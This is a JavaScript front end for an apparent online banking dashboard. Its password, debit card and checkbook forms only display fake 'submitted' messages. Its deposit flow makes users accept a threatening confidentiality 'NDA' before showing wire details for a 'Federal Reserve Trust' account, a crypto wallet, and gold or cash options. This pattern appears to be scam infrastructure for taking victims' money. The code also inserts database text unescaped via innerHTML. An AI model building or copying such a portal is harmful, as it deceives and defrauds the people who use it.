// Initialize Supabase client
const supabaseUrl = "https://hafzffbdqlojkuhgfsvy.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhhZnpmZmJkcWxvamt1aGdmc3Z5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkxOTA0NTksImV4cCI6MjA3NDc2NjQ1OX0.fYBo6l_W1lYE_sGnaxRZyroXHac1b1sXqxgJkqT5rnk";
const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

// Helper functions
const $ = (id) => document.getElementById(id);
const modals = document.querySelectorAll(".modal");
const openModal = (id) => $(id).setAttribute("aria-hidden", "false");
const closeModal = () => modals.forEach((m) => m.setAttribute("aria-hidden", "true"));

// Close modal on click of data-close buttons
document.querySelectorAll("[data-close]").forEach((btn) => btn.addEventListener("click", closeModal));

// Authentication
async function checkUser() {
  const { data, error } = await supabase.auth.getUser();
  if (error || !data.user) {
    window.location.href = "index.html";
    return;
  }

  const user = data.user;
  const { data: profile } = await supabase.from("profiles").select("full_name").eq("id", user.id).single();
  $("pf-welcome").textContent = profile?.full_name || "User";
  $("lastLogin").textContent = new Date().toLocaleString();

  loadAccounts(user.id);
}

// Load accounts
async function loadAccounts(userId) {
  const { data: accounts, error } = await supabase.from("accounts").select("*").eq("user_id", userId);

  const container = $("accountCards");
  container.innerHTML = "";

  if (error || !accounts?.length) {
    container.innerHTML = "<p class='text-sm text-gray-500'>No accounts found.</p>";
    return;
  }

  let total = 0;
  accounts.forEach((acc) => {
    total += parseFloat(acc.balance) || 0;

    const card = document.createElement("div");
    card.className = "account-card";
    card.innerHTML = `
      <div class="font-semibold text-gray-800">${acc.account_type.toUpperCase()}</div>
      <div class="text-sm text-gray-500">${acc.account_number}</div>
      <div class="text-lg font-bold mt-1">$${acc.balance.toFixed(2)}</div>
    `;
    container.appendChild(card);
  });

  $("totalBalance").textContent = `$${total.toFixed(2)}`;
  $("accountCount").textContent = accounts.length;
}

// ========== MODAL HANDLERS ==========

// Sidebar buttons
$("openRequestDebit").onclick = () => openModal("requestDebitModal");
$("openRequestCheck").onclick = () => openModal("requestCheckModal");
$("openChangePassword").onclick = () => openModal("changePasswordModal");
$("openContact").onclick = () => openModal("supportModal");

// Secure Asset Management
$("openSafeguardBtn").onclick = () => openModal("safeguardModal");

// Top right button
$("addMoneyBtn").onclick = () => openModal("safeguardModal");

// Request Debit & Checkbook submission
$("debitCardForm").onsubmit = async (e) => {
  e.preventDefault();
  $("debitResult").style.display = "block";
  $("debitResult").textContent = "Your Secure Card request has been submitted.";
};
$("checkbookForm").onsubmit = async (e) => {
  e.preventDefault();
  $("checkbookResult").style.display = "block";
  $("checkbookResult").textContent = "Your Checkbook request has been submitted.";
};

// Change password
$("passwordForm").onsubmit = async (e) => {
  e.preventDefault();
  $("passwordResult").style.display = "block";
  $("passwordResult").textContent = "Password change submitted.";
};

// Safeguard method flow
const safeguardModal = $("safeguardModal");
const safeguardBody = $("safeguardBody");

// Show NDA after selecting a method
safeguardBody.querySelectorAll("button").forEach((btn) => {
  btn.addEventListener("click", (e) => {
    const method = e.target.dataset.method;
    openNDAModal(method);
  });
});

function openNDAModal(method) {
  closeModal();

  const ndaModal = document.createElement("div");
  ndaModal.className = "modal";
  ndaModal.setAttribute("aria-hidden", "false");
  ndaModal.innerHTML = `
    <div class="modal-panel">
      <h3 class="text-lg font-semibold mb-2">Non-Disclosure & Compliance Agreement</h3>
      <p class="text-sm text-gray-600 mb-4">
        Before proceeding with your deposit via <strong>${formatMethod(method)}</strong>, please acknowledge and agree to the following terms:
      </p>
      <ul class="text-sm text-gray-600 list-disc pl-5 mb-4 space-y-1">
        <li>All transactions are confidential and comply with U.S. Treasury regulations.</li>
        <li>Information shared during this process must remain undisclosed to third parties.</li>
        <li>Violation of this NDA may result in legal action or account suspension.</li>
      </ul>

      <div class="space-y-2 mb-4">
        <label class="block text-sm">
          <input type="checkbox" id="chk1" class="mr-2"> I agree to the confidentiality terms.
        </label>
        <label class="block text-sm">
          <input type="checkbox" id="chk2" class="mr-2"> I confirm I am the authorized account holder.
        </label>
      </div>

      <div class="btn-row">
        <button class="btn-primary" id="continueNDA">Continue</button>
        <button class="btn-ghost" data-close>Close</button>
      </div>
    </div>
  `;
  document.body.appendChild(ndaModal);

  const chk1 = ndaModal.querySelector("#chk1");
  const chk2 = ndaModal.querySelector("#chk2");
  const continueBtn = ndaModal.querySelector("#continueNDA");
  const closeBtn = ndaModal.querySelector("[data-close]");

  closeBtn.onclick = () => ndaModal.remove();

  continueBtn.onclick = () => {
    if (!chk1.checked || !chk2.checked) {
      alert("Please check both boxes before continuing.");
      return;
    }
    ndaModal.remove();
    showDepositInstructions(method);
  };
}

async function showDepositInstructions(method) {
  // Fetch instructions from Supabase instead of using hardcoded ones
  const { data: userData } = await supabase.auth.getUser();
  if (!userData.user) {
    alert("You must be logged in to view deposit instructions.");
    return;
  }

  const { data, error } = await supabase
    .from("deposit_instructions")
    .select("details")
    .eq("user_id", userData.user.id)
    .eq("method_key", method)
    .single();

  let instructions = "";

  if (error && error.code !== "PGRST116") {
    console.error("Error fetching deposit instructions:", error);
    instructions = `<p class="text-red-500">Error loading instructions. Please contact support.</p>`;
  } else if (!data) {
    instructions = `<p>No deposit instructions found for <strong>${formatMethod(method)}</strong>. Please contact support.</p>`;
  } else {
    instructions = data.details;
  }

  // Create modal
  const instructionModal = document.createElement("div");
  instructionModal.className = "modal";
  instructionModal.setAttribute("aria-hidden", "false");
  instructionModal.innerHTML = `
    <div class="modal-panel">
      <h3 class="text-lg font-semibold mb-2">Deposit Instructions — ${formatMethod(method)}</h3>
      <div class="text-sm text-gray-600 mb-4">${instructions}</div>
      <div class="btn-row">
        <button class="btn-ghost" data-close>Close</button>
      </div>
    </div>
  `;
  document.body.appendChild(instructionModal);

  instructionModal.querySelector("[data-close]").onclick = () => instructionModal.remove();
}



function showDepositInstructions(method) {
  const instructionModal = document.createElement("div");
  instructionModal.className = "modal";
  instructionModal.setAttribute("aria-hidden", "false");

  let instructions = "";
  if (method === "wire_transfer") {
    instructions = `
      <p>Bank: Federal Reserve Trust<br>Account: 1240 5678 9000<br>Routing: 021000021</p>`;
  } else if (method === "crypto") {
    instructions = `<p>Scan the QR code below or use wallet ID:<br><strong>0xA45dC...98bF</strong></p><img src="images/crypto-qr.png" alt="QR" width="120" />`;
  } else if (method === "gold") {
    instructions = `<p>Please contact our certified custodian for physical deposit instructions.</p>`;
  } else {
    instructions = `<p>Certified cash deposits must be scheduled via Treasury support.</p>`;
  }

  instructionModal.innerHTML = `
    <div class="modal-panel">
      <h3 class="text-lg font-semibold mb-2">Deposit Instructions — ${formatMethod(method)}</h3>
      <div class="text-sm text-gray-600 mb-4">${instructions}</div>
      <div class="btn-row"><button class="btn-ghost" data-close>Close</button></div>
    </div>
  `;
  document.body.appendChild(instructionModal);

  instructionModal.querySelector("[data-close]").onclick = () => instructionModal.remove();
}

function formatMethod(m) {
  return {
    wire_transfer: "Wire Transfer",
    crypto: "Digital Asset (Crypto)",
    gold: "Physical Gold",
    cash: "Certified Cash",
  }[m] || "Deposit Method";
}

// Logout
$("logoutBtnSidebar").onclick = async () => {
  await supabase.auth.signOut();
  window.location.href = "index.html";
};

// Load user and accounts
checkUser();


// --- Supabase Deposit Instructions Integration ---
async function fetchDepositInstructions(methodKey) {
  const { data: userData } = await supabase.auth.getUser();
  if (!userData.user) {
    console.error("User not logged in");
    return;
  }

  const { data, error } = await supabase
    .from("deposit_instructions")
    .select("*")
    .eq("user_id", userData.user.id)
    .eq("method_key", methodKey)
    .single();

  if (error && error.code !== "PGRST116") {
    console.error("Error fetching deposit instructions:", error);
    return;
  }

  const detailsDiv = document.getElementById("deposit-details");
  if (detailsDiv) {
    detailsDiv.innerHTML = data?.details || "<p>No instructions found. Please contact support.</p>";
  }
}

async function updateDepositInstructions(methodKey, newDetails) {
  const { data: userData } = await supabase.auth.getUser();
  if (!userData.user) {
    console.error("User not logged in");
    return;
  }

  const { error } = await supabase
    .from("deposit_instructions")
    .upsert({
      user_id: userData.user.id,
      method_key: methodKey,
      details: newDetails,
      updated_at: new Date().toISOString(),
    }, { onConflict: ["user_id", "method_key"] });

  if (error) {
    console.error("Error updating deposit instructions:", error);
  } else {
    alert("Deposit instructions updated successfully!");
  }
}
